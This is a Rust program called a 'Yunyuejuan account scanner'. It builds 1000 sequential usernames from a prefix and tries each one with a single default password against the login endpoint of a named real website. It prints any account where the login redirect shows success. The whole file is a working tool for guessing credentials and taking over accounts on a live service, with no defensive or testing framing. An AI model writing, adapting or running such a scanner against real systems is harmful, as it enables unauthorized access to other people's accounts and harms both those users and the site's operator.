use hyper::{Client, Method, Request};
use std::io::Write;

fn console_log(data: &str) {
    std::io::stdout().write_all(data.as_bytes()).unwrap();
    std::io::stdout().flush().unwrap();
}

async fn check_async(username: &str, password: &str) -> bool {
    let post_form = format!("j_username={}&j_password={}", username, password);
    let client = Client::new();
    let req = Request::builder()
        .method(Method::POST)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .uri("http://sc.yunyuejuan.net/SystemLogin")
        .body(hyper::Body::from(post_form))
        .unwrap();

    client
        .request(req)
        .await
        .unwrap()
        .headers()
        .get("location")
        .unwrap()
        == "http://sc.yunyuejuan.net/navigation"
}

fn check(username: &str, password: &str) -> bool {
    let rt = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    rt.block_on(check_async(username, password))
}

fn main() {
    println!(
        "Yunyuejuan account scanner
Author: 31core
GitHub: https://github.com/31core
Website: https://31core.pythonanywhere.com"
    );

    console_log("Username: ");
    let mut username = String::new();
    std::io::stdin().read_line(&mut username).unwrap();
    console_log("Default password: ");
    let mut defpasswd = String::new();
    std::io::stdin().read_line(&mut defpasswd).unwrap();
    username.pop();
    defpasswd.pop();

    println!("Scanning...");

    for i in 0..1000 {
        let user = format!("{}{}{}", username, "0".repeat(3 - i.to_string().len()), i);

        let start_time = std::time::Instant::now();
        let test_result = check(&user, &defpasswd);

        if test_result {
            print!("{}\r", " ".repeat(30));
            std::io::stdout().flush().unwrap();
            println!("{user}\tOK");
        }

        print!(
            "{i} of 999 ({:.2} s per item)\r",
            start_time.elapsed().as_millis() as f32 / 1000.
        );
        std::io::stdout().flush().unwrap();
    }
}
